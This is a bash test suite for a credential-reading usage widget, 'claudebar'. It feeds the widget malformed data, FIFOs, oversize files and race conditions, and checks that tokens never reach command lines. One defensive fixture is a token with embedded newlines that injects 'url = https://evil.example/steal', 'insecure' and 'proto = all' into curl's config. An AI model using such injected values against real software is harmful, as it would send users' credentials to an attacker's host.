#!/usr/bin/env bash
source "$(dirname "$0")/lib.sh"
GOOD='{"five_hour":{"utilization":40,"resets_at":"2030-01-01T00:00:00+00:00"},"seven_day":{"utilization":20,"resets_at":"2030-01-01T00:00:00+00:00"}}'
chk(){ assert_exit0 "$1: exit 0"; assert_json_valid "$1: valid JSON"; }

# --- malformed usage payloads ---
run_claudebar '{"five_hour":1,"seven_day":{"utilization":20,"resets_at":"2030-01-01T00:00:00+00:00"}}'; chk "five_hour non-object"
run_claudebar '{"five_hour":{"utilization":"high","resets_at":5},"seven_day":{"utilization":20}}'; chk "string utilization + non-string resets_at"
run_claudebar '{"five_hour":{"utilization":20},"seven_day":{"utilization":20},"seven_day_sonnet":7}'; chk "seven_day_sonnet non-object"
run_claudebar '{"five_hour":{"utilization":20},"seven_day":{"utilization":20},"extra_usage":9}'; chk "extra_usage non-object"
run_claudebar '{"five_hour":{"utilization":20},"seven_day":{"utilization":20},"extra_usage":{"is_enabled":true,"monthly_limit":"x","used_credits":[1]}}'; chk "extra_usage string/array fields"
run_claudebar '123'; chk "usage is a scalar"
run_claudebar '[]'; chk "usage is an array"
run_claudebar '{"seven_day":{"utilization":20}}'; chk "missing five_hour"

# --- malformed creds (valid JSON, wrong types) ---
run_claudebar_creds '{"claudeAiOauth":"not-an-object"}' "$GOOD"; chk "claudeAiOauth non-object"
run_claudebar_creds '{"claudeAiOauth":{"accessToken":"x","expiresAt":"soon","subscriptionType":["a"],"rateLimitTier":5}}' "$GOOD"; chk "wrong-typed creds fields"
run_claudebar_creds '{"claudeAiOauth":{}}' "$GOOD"; chk "empty claudeAiOauth"

# --- syntactically INVALID json cache (try/catch can't catch parse errors) ---
run_claudebar 'not json at all'; chk "invalid-JSON usage cache"
run_claudebar '{"five_hour":{"utilization":20'; chk "truncated/invalid JSON cache"

# --- huge numbers (1e100) that jq emits in scientific notation, breaking (( )) ---
run_claudebar '{"five_hour":{"utilization":1e100,"resets_at":"2030-01-01T00:00:00+00:00"},"seven_day":{"utilization":20,"resets_at":"2030-01-01T00:00:00+00:00"}}'; chk "1e100 utilization"
run_claudebar '{"five_hour":{"utilization":20},"seven_day":{"utilization":20},"extra_usage":{"is_enabled":true,"monthly_limit":1e100,"used_credits":1e100}}'; chk "1e100 extra credits"

# --- negative numbers must not make a negative-width bar (printf crash) ---
run_claudebar '{"five_hour":{"utilization":-100000,"resets_at":"2030-01-01T00:00:00+00:00"},"seven_day":{"utilization":-5,"resets_at":"2030-01-01T00:00:00+00:00"}}'; chk "negative utilization"
run_claudebar '{"five_hour":{"utilization":20},"seven_day":{"utilization":20},"extra_usage":{"is_enabled":true,"monthly_limit":1000,"used_credits":-100000}}'; chk "negative used_credits"

# --- multi-document JSON stream in the cache (jq -e . alone would accept it) ---
run_claudebar '{"five_hour":{"utilization":10},"seven_day":{"utilization":20}} {"five_hour":{"utilization":30},"seven_day":{"utilization":40}}'; chk "multi-document usage stream"
# --- hostile FILE TYPES on paths the script does not own ---
# The plugin runs INSIDE the long-lived omarchy-shell process, so a read that
# never returns — or a write, because open(2) on a FIFO blocks for a reader that
# never comes — does not degrade the widget, it takes the shell down. `timeout`
# IS the assertion here: exit 124 is exactly the hang being guarded against.
# The oversize cases prove the byte caps, which is the other half: without them
# a multi-megabyte file lands whole in a shell variable inside that same process.
_run_hostile() {  # <label> <setup-fn>   (setup-fn is called with the fake HOME)
    local label="$1" setup="$2" home
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
             "$home/.local/state/omarchy/current/theme" "$home/.cache/wal" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf '#!/usr/bin/env bash\nexit 1\n' > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf '%s' "$VALID_CREDS" > "$home/.claude/.credentials.json"
    printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
    "$setup" "$home"
    # Budgets pinned to 0: with no reachable network these cases would otherwise
    # each burn the full boot-like retry budget for nothing.
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 20 "$SCRIPT"); RC=$?
    rm -rf "$home"
    [[ "$RC" -ne 124 ]] && _ok "$label: returns" || _no "$label: returns" "timed out — blocked"
    assert_exit0 "$label: exit 0"
    assert_json_valid "$label: valid JSON"
}
_big() { head -c 3000000 /dev/zero | tr '\0' 'A' > "$1"; }

_h_fifo_cache()   { rm -f "$1/.cache/claudebar/usage.json"; mkfifo "$1/.cache/claudebar/usage.json"; }
_h_fifo_creds()   { rm -f "$1/.claude/.credentials.json"; mkfifo "$1/.claude/.credentials.json"; }
_h_fifo_lock()    { mkfifo "$1/.cache/claudebar/.fetch.lock"; }
_h_fifo_lasterr() { mkfifo "$1/.cache/claudebar/.last_error"; }
_h_fifo_credits() { mkfifo "$1/.cache/claudebar/credits.json"; }
_h_fifo_theme()   { mkfifo "$1/.local/state/omarchy/current/theme/colors.toml"; }
_h_fifo_pywal()   { mkfifo "$1/.cache/wal/colors.json"; }
_h_fifo_claude()  { rm -f "$1/.claude.json"; mkfifo "$1/.claude.json"; }
_h_big_cache()    { _big "$1/.cache/claudebar/usage.json"; }
_h_big_creds()    { _big "$1/.claude/.credentials.json"; }
_h_big_theme()    { _big "$1/.local/state/omarchy/current/theme/colors.toml"; }

_run_hostile "FIFO usage cache"    _h_fifo_cache
_run_hostile "FIFO credentials"    _h_fifo_creds
_run_hostile "FIFO fetch lock"     _h_fifo_lock     # write side: `exec 9>` blocks
_run_hostile "FIFO .last_error"    _h_fifo_lasterr
_run_hostile "FIFO credits cache"  _h_fifo_credits
_run_hostile "FIFO omarchy theme"  _h_fifo_theme
_run_hostile "FIFO pywal cache"    _h_fifo_pywal
_run_hostile "FIFO ~/.claude.json" _h_fifo_claude
_run_hostile "3MB usage cache"     _h_big_cache
_run_hostile "3MB credentials"     _h_big_creds
_run_hostile "3MB omarchy theme"   _h_big_theme
# --- a token that tries to inject options into curl's config file ---
# The bearer reaches curl through `--config -`, and that parser is line
# oriented: a newline inside a value ends the line and the rest parses as fresh
# options. `url = https://evil` plus `insecure` is a second transfer carrying
# the credential to a host the attacker picked, and `proto = all` cancels the
# --proto '=https' on the command line. Writing the credentials file is exactly
# the threat this review is about, so the token must be REFUSED, not escaped:
# what reaches curl must never contain an option line.
_run_injection() { # <label> <token> [expect-header]
    local label="$1" token="$2" want_hdr="${3:-no}" home cfg sent
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    cfg="$home/curl-stdin.log"
    # A curl stub that keeps whatever config it was handed, then fails.
    { printf '#!/usr/bin/env bash\n'
      printf 'cat >> %q 2>/dev/null\n' "$cfg"
      printf 'exit 1\n'
    } > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    jq -nc --arg t "$token" \
        '{claudeAiOauth:{accessToken:$t,refreshToken:"y",expiresAt:4102444800000,subscriptionType:"max"}}' \
        > "$home/.claude/.credentials.json"
    printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
    # --refresh so the usage fetch runs instead of being served from cache.
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 20 "$SCRIPT" --refresh); RC=$?
    sent=""; [[ -f "$cfg" ]] && sent=$(cat "$cfg")
    if grep -qiE '^[[:space:]]*url[[:space:]]*=' <<< "$sent"; then
        _no "$label: no url= reaches curl" "curl config was: $sent"
    else
        _ok "$label: no url= reaches curl"
    fi
    if grep -qiE '^[[:space:]]*(proto|insecure|output|cert)\b' <<< "$sent"; then
        _no "$label: no proto/insecure/output reaches curl" "curl config was: $sent"
    else
        _ok "$label: no proto/insecure/output reaches curl"
    fi
    # The positive control proves the stub really does capture the config, so a
    # clean result above means "refused", never "the harness saw nothing".
    if [[ "$want_hdr" == "yes" ]]; then
        grep -q 'Authorization: Bearer' <<< "$sent" \
            && _ok "$label: bearer header still sent" \
            || _no "$label: bearer header still sent" "config was: $sent"
    fi
    assert_exit0 "$label: exit 0"
    assert_json_valid "$label: valid JSON"
    rm -rf "$home"
}

_run_injection "clean token" 'sk-ant-oat01-AbC._~+/=-' yes
_run_injection "token with LF + url/proto" 'abc"
url = https://evil.example/steal
insecure
proto = all
header = "X: y'
_run_injection "token with CR"        $'abc\rurl = https://evil.example'
_run_injection "token with a quote"   'abc"def'
_run_injection "token with backslash" 'abc\def'

# --- the reader must not block when the path becomes a FIFO AFTER the check ---
# `[[ -f ]]` answers about a PATH, and the open that follows is a separate
# syscall: whoever owns the directory swaps the regular file for a FIFO in
# between and the open waits for a writer that never comes. The stub below
# makes that race deterministic — it performs the swap and then execs the real
# tool — and read_bounded is taken verbatim out of the shipped script, so what
# runs here is the shipped code. `dd iflag=nonblock` returns at once; `head -c`
# hangs, which is exit 124.
_test_read_bounded_race() {
    local dir target real fn rc out
    dir="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    target="$dir/state.json"
    mkdir -p "$dir/bin" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    fn="$dir/read_bounded.sh"
    sed -n '/^read_bounded() {/,/^}/p' "$SCRIPT" > "$fn"

    # Positive control FIRST: without it a botched extraction would leave
    # `read_bounded` undefined, the run would exit 127, and the race assertion
    # below — which only rejects 124 — would pass while proving nothing.
    printf 'the-quick-brown-fox' > "$target"
    out=$(timeout 5 bash -c 'source "$1"; read_bounded "$2" 65536' _ "$fn" "$target" 2>/dev/null)
    [[ "$out" == "the-quick-brown-fox" ]] \
        && _ok "read_bounded race harness: the extracted function really runs" \
        || _no "read_bounded race harness: the extracted function really runs" "got: $out"
    out=$(head -c 200000 /dev/zero | tr '\0' 'A' > "$target"; \
          timeout 5 bash -c 'source "$1"; read_bounded "$2" 65536' _ "$fn" "$target" 2>/dev/null | wc -c)
    [[ "$out" == "65536" ]] \
        && _ok "read_bounded: still truncates at the cap" \
        || _no "read_bounded: still truncates at the cap" "read $out bytes"

    # Every reader it could plausibly use gets a stub, so the assertion is about
    # the OPEN being non-blocking rather than about which tool was picked.
    local tool
    for tool in dd head cat; do
        real="$(command -v "$tool")" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
        { printf '#!/usr/bin/env bash\n'
          printf '# the swap the -f check cannot see\n'
          printf 'rm -f %q && mkfifo %q\n' "$target" "$target"
          printf 'exec %q "$@"\n' "$real"
        } > "$dir/bin/$tool" && chmod +x "$dir/bin/$tool" \
            || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    done
    rm -f "$target"; printf 'still-a-regular-file' > "$target"
    PATH="$dir/bin:$PATH" timeout 5 bash -c 'source "$1"; read_bounded "$2" 65536' \
        _ "$fn" "$target" >/dev/null 2>&1
    rc=$?
    [[ "$rc" -ne 124 ]] \
        && _ok "read_bounded: returns when the file turns into a FIFO after the check" \
        || _no "read_bounded: returns when the file turns into a FIFO after the check" "timed out — blocked"
    rm -rf "$dir"
}
_test_read_bounded_race

# --- curl reads ~/.curlrc before our own config unless -q is FIRST ---
# Two halves. This one is the mechanism, run against the real curl with no
# server: curl parses its config before it dials, so an unknown option in
# ~/.curlrc is diagnosed on a connection that is refused instantly. Without -q
# the file is read; with it, it is not. The other half, below, is that every
# curl the script builds actually carries the flag.
_test_curlrc_mechanism() {
    local real dir without with
    real="$(command -v curl)" || { _no "curl -q mechanism" "no curl on PATH"; return; }
    dir="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf 'this-option-does-not-exist\n' > "$dir/.curlrc"
    # Port 9 on loopback: refused at once, so this never leaves the machine.
    # XDG_* pinned like every other fake-HOME run in this suite: curl does not
    # read them, but the hygiene guard in test_json.sh checks the shape of the
    # invocation, not what the program does with it. An exception here would
    # quietly weaken that guard for everyone.
    without=$(HOME="$dir" XDG_STATE_HOME="$dir/.local/state" \
                XDG_CACHE_HOME="$dir/.cache" XDG_CONFIG_HOME="$dir/.config" \
                timeout 10 "$real" -s --max-time 2 --proto '=https' \
                https://127.0.0.1:9/x 2>&1)
    with=$(HOME="$dir" XDG_STATE_HOME="$dir/.local/state" \
                XDG_CACHE_HOME="$dir/.cache" XDG_CONFIG_HOME="$dir/.config" \
                timeout 10 "$real" -q -s --max-time 2 --proto '=https' \
                https://127.0.0.1:9/x 2>&1)
    grep -q 'this-option-does-not-exist' <<< "$without" \
        && _ok "curl -q mechanism: without -q the ~/.curlrc IS read" \
        || _no "curl -q mechanism: without -q the ~/.curlrc IS read" "curl said: $without"
    grep -q 'this-option-does-not-exist' <<< "$with" \
        && _no "curl -q mechanism: with -q the ~/.curlrc is NOT read" "curl said: $with" \
        || _ok "curl -q mechanism: with -q the ~/.curlrc is NOT read"
    rm -rf "$dir"
}
_test_curlrc_mechanism

# --- argv spy: what every curl and every jq of a full refresh cycle was given ---
# /proc/<pid>/cmdline is world readable and /proc/<pid>/environ is not, so a
# secret belongs in the environment or on stdin, never in an argument — and
# that holds for jq exactly as much as for curl. The stubs record their own
# argv; jq then execs the real jq so the script keeps working, and curl answers
# with canned bodies so the whole cycle runs: refresh, usage fetch, credits.
# CLAUDE_JSON is the file the organization UUID comes from; the caller varies
# it to prove the bound on that read.
_run_spy() { # _run_spy <label> <claude-json-setup-fn>
    local label="$1" setup="$2" home real_jq
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    real_jq="$(command -v jq)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    SPY_CURL_ARGV="$home/curl-argv.log"; SPY_CURL_STDIN="$home/curl-stdin.log"
    SPY_JQ_ARGV="$home/jq-argv.log"; SPY_STAGE_LOG="$home/stage.log"
    : > "$SPY_CURL_ARGV"; : > "$SPY_CURL_STDIN"; : > "$SPY_JQ_ARGV"; : > "$SPY_STAGE_LOG"
    { printf '#!/usr/bin/env bash\n'
      printf 'printf "%%s " "$@" >> %q; printf "\\n" >> %q\n' "$SPY_CURL_ARGV" "$SPY_CURL_ARGV"
      printf 'cat >> %q 2>/dev/null\n' "$SPY_CURL_STDIN"
      printf 'if [[ "$*" == *oauth/token* ]]; then\n'
      # The write-back temp must already sit BESIDE the target while the token
      # endpoint is being called: staged before the POST (a 200 may rotate the
      # refresh token, so an unpersistable refresh must never start) and in the
      # same directory (a /tmp temp makes the mv a non-atomic cross-fs copy).
      # The 6-?  glob matches the mktemp XXXXXX suffix, never .credentials.json.
      printf 'ls "$HOME/.claude/".credentials.?????? >> %q 2>/dev/null\n' "$SPY_STAGE_LOG"
      printf '  printf "%%s\\n200" %q\n' "$SPY_REFRESH_RESP"
      printf 'elif [[ "$*" == *prepaid/credits* ]]; then\n'
      printf '  printf "%%s\\n200" %q\n' '{"amount":4200}'
      printf 'else\n'
      printf '  printf "%%s\\n200" %q\n' "$GOOD_EXTRA"
      printf 'fi\n'
    } > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    # Tab separated: a jq filter spans lines, and one record per invocation is
    # what makes "no sentinel anywhere in argv" a readable assertion.
    { printf '#!/usr/bin/env bash\n'
      printf '{ printf "%%s\\t" "$@"; printf "\\n"; } >> %q\n' "$SPY_JQ_ARGV"
      printf 'exec %q "$@"\n' "$real_jq"
    } > "$home/bin/jq" && chmod +x "$home/bin/jq" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    # expiresAt in the past is what makes the refresh — and with it the
    # credentials rewrite — actually run. Both sentinels pass token_is_safe.
    printf '%s' "{\"claudeAiOauth\":{\"accessToken\":\"$SPY_ACCESS\",\"refreshToken\":\"$SPY_REFRESH\",\"expiresAt\":1000,\"subscriptionType\":\"max\"}}" \
        > "$home/.claude/.credentials.json"
    printf '%s' "$GOOD_EXTRA" > "$home/.cache/claudebar/usage.json"
    "$setup" "$home"
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 30 "$SCRIPT" --refresh); RC=$?
    [[ "$RC" -ne 124 ]] && _ok "$label: returns" || _no "$label: returns" "timed out — blocked"
    assert_exit0 "$label: exit 0"
    assert_json_valid "$label: valid JSON"
    SPY_HOME="$home"
}

SPY_ACCESS='ACCESSTOKENSENTINEL-aaa'
SPY_REFRESH='REFRESHTOKENSENTINEL-bbb'
SPY_NEW_ACCESS='NEWACCESSSENTINEL-ccc'
SPY_NEW_REFRESH='NEWREFRESHSENTINEL-ddd'
SPY_REFRESH_RESP="{\"access_token\":\"$SPY_NEW_ACCESS\",\"refresh_token\":\"$SPY_NEW_REFRESH\",\"expires_in\":3600}"
# extra_usage is what makes the credits request happen at all.
GOOD_EXTRA='{"five_hour":{"utilization":40,"resets_at":"2030-01-01T00:00:00+00:00"},"seven_day":{"utilization":20,"resets_at":"2030-01-01T00:00:00+00:00"},"extra_usage":{"is_enabled":true,"monthly_limit":10000,"used_credits":100}}'

_cj_small() { printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$1/.claude.json"; }
_cj_huge()  { # 5 MiB of VALID JSON: jq would parse it happily, the cap is what stops it
    { printf '{"oauthAccount":{"organizationUuid":"org-test"},"pad":"'
      head -c 5000000 /dev/zero | tr '\0' 'A'
      printf '"}'
    } > "$1/.claude.json"
}

_run_spy "argv spy" _cj_small
_spy_argv=$(cat "$SPY_HOME/curl-argv.log"); _spy_stdin=$(cat "$SPY_HOME/curl-stdin.log")
_spy_jq=$(cat "$SPY_HOME/jq-argv.log")

# Positive controls first: a spy that captured nothing would pass every
# "the secret is not there" assertion below without proving anything.
(( $(grep -c . <<< "$_spy_argv") >= 3 )) \
    && _ok "argv spy: all three transfers were captured" \
    || _no "argv spy: all three transfers were captured" "log was: $_spy_argv"
grep -qF -- "$SPY_REFRESH" <<< "$_spy_stdin" \
    && _ok "argv spy: the refresh token DID travel, on stdin" \
    || _no "argv spy: the refresh token DID travel, on stdin" "stdin log: $_spy_stdin"
grep -qF -- "Authorization: Bearer $SPY_NEW_ACCESS" <<< "$_spy_stdin" \
    && _ok "argv spy: the refreshed bearer DID travel, on stdin" \
    || _no "argv spy: the refreshed bearer DID travel, on stdin" "stdin log: $_spy_stdin"
grep -qF 'claudeAiOauth.accessToken=$ENV.at' <<< "$_spy_jq" \
    && _ok "argv spy: the credentials rewrite really ran" \
    || _no "argv spy: the credentials rewrite really ran" "jq log: $_spy_jq"
grep -qF 'grant_type' <<< "$_spy_jq" \
    && _ok "argv spy: the refresh body was really built" \
    || _no "argv spy: the refresh body was really built" "jq log: $_spy_jq"

# A: -q, and FIRST — after any other option curl has already read ~/.curlrc.
_bad_q=$(grep -vE '^-q ' <<< "$_spy_argv" | grep . || true)
[[ -z "$_bad_q" ]] \
    && _ok "curl: -q is the first argument of every transfer" \
    || _no "curl: -q is the first argument of every transfer" "these did not start with -q: $_bad_q"

# Neither secret may appear in ANY command line, curl's or jq's.
for _sentinel in "$SPY_ACCESS" "$SPY_REFRESH" "$SPY_NEW_ACCESS" "$SPY_NEW_REFRESH"; do
    grep -qF -- "$_sentinel" <<< "$_spy_argv" \
        && _no "curl argv: no $_sentinel" "argv log: $_spy_argv" \
        || _ok "curl argv: no $_sentinel"
    grep -qF -- "$_sentinel" <<< "$_spy_jq" \
        && _no "jq argv: no $_sentinel" "jq log: $_spy_jq" \
        || _ok "jq argv: no $_sentinel"
done
# The credits request is the positive control for the .claude.json case below:
# with a readable file, the organization UUID is found and the request happens.
grep -qF '/prepaid/credits' <<< "$_spy_argv" \
    && _ok "small .claude.json: the credits request happens" \
    || _no "small .claude.json: the credits request happens" "argv log: $_spy_argv"

# The rewrite really LANDED: the jq argv check above only proves the filter
# ran, not that its output survived the staging and the mv. The file is the
# assertion — both new tokens, read back after the full cycle.
_creds_after=$(cat "$SPY_HOME/.claude/.credentials.json")
[[ "$(jq -r '.claudeAiOauth.accessToken' <<< "$_creds_after")" == "$SPY_NEW_ACCESS" ]] \
    && _ok "rewrite: the new access token is in the FILE" \
    || _no "rewrite: the new access token is in the FILE" "file was: $_creds_after"
[[ "$(jq -r '.claudeAiOauth.refreshToken' <<< "$_creds_after")" == "$SPY_NEW_REFRESH" ]] \
    && _ok "rewrite: the new refresh token is in the FILE" \
    || _no "rewrite: the new refresh token is in the FILE" "file was: $_creds_after"
# Same-dir staging, observed at POST time by the curl stub (see _run_spy) —
# and nothing left behind once the cycle is over.
grep -q . "$SPY_STAGE_LOG" \
    && _ok "staging: the temp sits beside the target during the POST" \
    || _no "staging: the temp sits beside the target during the POST" "stage log empty"
compgen -G "$SPY_HOME/.claude/.credentials.??????" >/dev/null \
    && _no "staging: no temp left behind" "$(ls -A "$SPY_HOME/.claude")" \
    || _ok "staging: no temp left behind"
rm -rf "$SPY_HOME"

# --- an oversize ~/.claude.json degrades to "no credits data", it does not hang ---
# jq used to open this file itself, with nothing bounding it. The file is the
# CLI's own state and it grows; a big enough one is a jq that may never finish,
# inside the shell process. Note the payload here is VALID JSON — jq would read
# all 5 MiB of it without complaint, so passing this proves the cap, not luck.
_run_spy "5MB .claude.json" _cj_huge
_spy_argv=$(cat "$SPY_HOME/curl-argv.log")
grep -qF '/prepaid/credits' <<< "$_spy_argv" \
    && _no "5MB .claude.json: no credits request" "argv log: $_spy_argv" \
    || _ok "5MB .claude.json: no credits request"
rm -rf "$SPY_HOME"

# --- mktemp failure for the credentials temp: the refresh must not RUN ---
# The temp is staged before the POST precisely because a 200 may rotate the
# refresh token: a refresh whose result cannot be persisted would invalidate
# the stored token and keep nothing. So the assertion is not "it degrades
# nicely" but "the token endpoint is never called" — and the stored
# credentials are byte-identical afterwards. Exit 0 + valid JSON, as always.
_test_mktemp_fail() {
    local home real_mktemp argvlog creds_before
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    real_mktemp="$(command -v mktemp)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    argvlog="$home/curl-argv.log"; : > "$argvlog"
    { printf '#!/usr/bin/env bash\n'
      printf 'printf "%%s " "$@" >> %q; printf "\\n" >> %q\n' "$argvlog" "$argvlog"
      printf 'exit 1\n'
    } > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    # Fails ONLY for the credentials template; every cache temp passes through.
    { printf '#!/usr/bin/env bash\n'
      printf 'for a in "$@"; do [[ "$a" == *.credentials.* ]] && exit 1; done\n'
      printf 'exec %q "$@"\n' "$real_mktemp"
    } > "$home/bin/mktemp" && chmod +x "$home/bin/mktemp" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    # expiresAt in the past is what forces the refresh path.
    creds_before="{\"claudeAiOauth\":{\"accessToken\":\"$SPY_ACCESS\",\"refreshToken\":\"$SPY_REFRESH\",\"expiresAt\":1000,\"subscriptionType\":\"max\"}}"
    printf '%s' "$creds_before" > "$home/.claude/.credentials.json"
    printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 20 "$SCRIPT"); RC=$?
    assert_exit0 "mktemp fail: exit 0"
    assert_json_valid "mktemp fail: valid JSON"
    # Both output modes: the contract holds for the waybar document AND --json.
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 20 "$SCRIPT" --json); RC=$?
    assert_exit0 "mktemp fail --json: exit 0"
    assert_json_valid "mktemp fail --json: valid JSON"
    grep -q 'oauth/token' "$argvlog" \
        && _no "mktemp fail: the token endpoint is never called" "argv: $(cat "$argvlog")" \
        || _ok "mktemp fail: the token endpoint is never called"
    [[ "$(cat "$home/.claude/.credentials.json")" == "$creds_before" ]] \
        && _ok "mktemp fail: the stored credentials are untouched" \
        || _no "mktemp fail: the stored credentials are untouched" \
               "file was: $(cat "$home/.claude/.credentials.json")"
    rm -rf "$home"
}
_test_mktemp_fail

# --- the CLI writes the file DURING the refresh POST: its write survives ---
# The flock serializes claudebar instances, not the claude CLI. The curl stub
# makes the race deterministic: while "answering" the token endpoint it
# replaces the credentials file, exactly like a CLI that refreshed on its own
# mid-POST. The compare-before-write must then DROP claudebar's version —
# the CLI's tokens stay, the refreshed ones are used in memory only.
_test_concurrent_write() {
    local home cli_creds creds_after
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    cli_creds='{"claudeAiOauth":{"accessToken":"CLIWROTEACCESS-eee","refreshToken":"CLIWROTEREFRESH-fff","expiresAt":4102444800000,"subscriptionType":"max"}}'
    { printf '#!/usr/bin/env bash\n'
      printf 'if [[ "$*" == *oauth/token* ]]; then\n'
      printf '  printf "%%s" %q > "$HOME/.claude/.credentials.json"\n' "$cli_creds"
      printf '  printf "%%s\\n200" %q\n' "$SPY_REFRESH_RESP"
      printf 'else\n'
      printf '  printf "%%s\\n200" %q\n' "$GOOD"
      printf 'fi\n'
    } > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf '%s' "{\"claudeAiOauth\":{\"accessToken\":\"$SPY_ACCESS\",\"refreshToken\":\"$SPY_REFRESH\",\"expiresAt\":1000,\"subscriptionType\":\"max\"}}" \
        > "$home/.claude/.credentials.json"
    printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
            CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
            timeout 20 "$SCRIPT" --refresh); RC=$?
    assert_exit0 "concurrent write: exit 0"
    assert_json_valid "concurrent write: valid JSON"
    creds_after=$(cat "$home/.claude/.credentials.json")
    [[ "$creds_after" == "$cli_creds" ]] \
        && _ok "concurrent write: the CLI's write survives" \
        || _no "concurrent write: the CLI's write survives" "file was: $creds_after"
    compgen -G "$home/.claude/.credentials.??????" >/dev/null \
        && _no "concurrent write: no temp left behind" "$(ls -A "$home/.claude")" \
        || _ok "concurrent write: no temp left behind"
    rm -rf "$home"
}
_test_concurrent_write

# --- the fetch lock is refused on the DESCRIPTOR, not on a stat of the path ---
# The pre-open `writable_path` check was a race of its own; the open is now
# read-write, which fifo(7) guarantees never blocks, and the type check runs on
# fd 9 afterwards. This asserts the message that check produces — the run
# returning and staying valid JSON is already covered by the FIFO lock case
# above, and both come from the same code path only if that check exists.
_test_lock_fd_check() {
    local home
    home="$(mktemp -d)" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    mkdir -p "$home/.claude" "$home/.cache/claudebar" "$home/bin" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf '#!/usr/bin/env bash\nexit 1\n' > "$home/bin/curl" && chmod +x "$home/bin/curl" \
        || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
    printf '%s' "$VALID_CREDS" > "$home/.claude/.credentials.json"
    printf '%s' "$GOOD" > "$home/.cache/claudebar/usage.json"
    mkfifo "$home/.cache/claudebar/.fetch.lock"
    OUT=$(run_pinned "$home" timeout 20 "$SCRIPT"); RC=$?
    [[ "$RC" -ne 124 ]] && _ok "FIFO lock: returns" || _no "FIFO lock: returns" "timed out — blocked"
    assert_exit0 "FIFO lock: exit 0"
    assert_tip_has "FIFO lock: says the lock is not a regular file" "not a regular file"
    rm -rf "$home"
}
_test_lock_fd_check

finish
